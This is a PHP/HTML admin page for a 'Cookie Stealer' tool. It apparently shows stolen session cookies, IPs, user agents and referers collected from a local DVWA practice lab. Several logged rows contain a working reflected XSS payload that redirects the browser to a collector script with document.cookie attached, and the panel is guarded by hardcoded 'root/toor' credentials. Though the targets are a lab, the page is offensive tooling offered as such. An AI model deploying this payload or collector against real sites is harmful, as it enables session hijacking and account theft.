<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="Content-Style-Type" CONTENT="text/css">
<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW" />

<title>Cookie Stealer</title>
<style type="text/css">
<!--

body { background-color: #4CAF50; color:white; font-weight:bold; font-family:verdana;} /* Green */;


.style1{
    background-color: #9FFDEF;
    border: none;
    color: white;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 16px;
    margin: 4px 2px;
    cursor: pointer;
}
.danger {background-color: #f44336; 
	color: white;
	text-align:center;
    padding: 14px 28px;
    font-size: 16px;
	font-weight: bold;
    cursor: pointer;} /* Red */ 
.danger:hover {background: #da190b;}
-->
</style></head>
<body>
<div align="center"><span class="danger">CGF SECURITY - Cookie Stealer</span></div>
<p>&nbsp;</p>
<p><?php
$LOGIN="root";  //login
$PASSWD="toor";   //password
if ($_POST['logintext']==$LOGIN && $_POST['passwdtext']==$PASSWD) {  ?>
<html>
<body>
<p></p>

<table width="726" border="1">
<tr><td>IP:</td><td>Host:</td><td>User-Agent:</td><td>Date:</td><td>Time:</td><td>Referer:</td><td>Cookie:</td></tr>
<tr><td>192.168.0.2</td><td>DESKTOP-RG2DI28.domain.name</td><td>Mozilla/5.0 (Windows NT 10.0; rv:55.0) Gecko/20100101 Firefox/55.0</td><td>23/08/2017</td><td>16:43:21</td><td>http://192.168.0.2/dvwa/vulnerabilities/xss_s/</td><td>security=low; PHPSESSID=6aa9j505r577aek7jf3je2t6u6<br>Referrer of vuln page is http://192.168.0.2/dvwa/vulnerabilities/xss_s/</td></tr>
<tr><td>192.168.0.2</td><td>DESKTOP-RG2DI28.domain.name</td><td>Mozilla/5.0 (Windows NT 10.0; rv:55.0) Gecko/20100101 Firefox/55.0</td><td>23/08/2017</td><td>17:55:32</td><td>http://192.168.0.2/dvwa/vulnerabilities/xss_s/</td><td>security=low; PHPSESSID=6aa9j505r577aek7jf3je2t6u6<br>Referrer of vuln page is http://192.168.0.2/dvwa/vulnerabilities/xss_r/</td></tr>
<tr><td>192.168.0.2</td><td>DESKTOP-RG2DI28.domain.name</td><td>Mozilla/5.0 (Windows NT 10.0; rv:55.0) Gecko/20100101 Firefox/55.0</td><td>23/08/2017</td><td>17:56:24</td><td>http://192.168.0.2/dvwa/vulnerabilities/xss_r/?name=x%3Cscript%3Elocation.href=%27http://192.168.0.2/dvwa/c.php?c=%27%2Bescape(document.cookie)%3C/script%3E</td><td>security=low; PHPSESSID=6aa9j505r577aek7jf3je2t6u6</td></tr>
<tr><td>192.168.0.2</td><td>DESKTOP-RG2DI28.domain.name</td><td>Mozilla/5.0 (Windows NT 10.0; rv:55.0) Gecko/20100101 Firefox/55.0</td><td>23/08/2017</td><td>17:59:30</td><td>http://192.168.0.2/dvwa/vulnerabilities/xss_r/?name=x%3Cscript%3Elocation.href=%27http://192.168.0.2/dvwa/c.php?c=%27%2Bescape(document.cookie)%3C/script%3E</td><td>security=low; PHPSESSID=6aa9j505r577aek7jf3je2t6u6</td></tr>
<tr><td>192.168.0.2</td><td>DESKTOP-RG2DI28.domain.name</td><td>Mozilla/5.0 (Windows NT 10.0; rv:55.0) Gecko/20100101 Firefox/55.0</td><td>23/08/2017</td><td>18:00:28</td><td>http://192.168.0.2/dvwa/vulnerabilities/xss_r/?name=x%3Cscript%3Elocation.href=%27http://192.168.0.2/dvwa/c.php?c=%27%2Bescape(document.cookie)%3C/script%3E</td><td>security=low; PHPSESSID=6aa9j505r577aek7jf3je2t6u6</td></tr>
<tr><td>192.168.0.2</td><td>DESKTOP-RG2DI28.domain.name</td><td>Mozilla/5.0 (Windows NT 10.0; rv:55.0) Gecko/20100101 Firefox/55.0</td><td>23/08/2017</td><td>18:03:46</td><td>http://192.168.0.2/dvwa/vulnerabilities/xss_r/?name=x%3Cscript%3Elocation.href=%27http://192.168.0.2/dvwa/c.php?c=%27%2Bescape(document.cookie)%3C/script%3E</td><td>security=low; PHPSESSID=6aa9j505r577aek7jf3je2t6u6</td></tr>
<!-- Breakpoint -->
</table>
<p>&nbsp;</p>
<div align="center"><span class="danger">@venkat_fm </span></div>
</body>
</html>

<?php } else { ?>
<html>
<body>
<p>Log in to continue</p>
<form name="connexion" action="<?php echo ($_SERVER['PHP_SELF']); ?>" method="post">
  <table width="298" border="1">
<tr>
        <td width="102">Login :</td>
      <td width="180"><input name="logintext" type="text" size="30" maxlength="30" /></td>
      </tr>
      <tr>
        <td>Password :</td>
        <td><input name="passwdtext" type="text" size="30" maxlength="30" /></td>
      </tr>
    </table>
  <table width="298" border="0">
    <tr>
      <td><div align="center">
        <input name="envoi" class="style1" type="submit" value="LOGIN" />
      </div></td>
    </tr>
  </table>
  </form>
  <p>&nbsp;</p>
<div align="center"><span class="danger">@venkat_fm  </span></div>
</body>
</html>
<?php } ?>

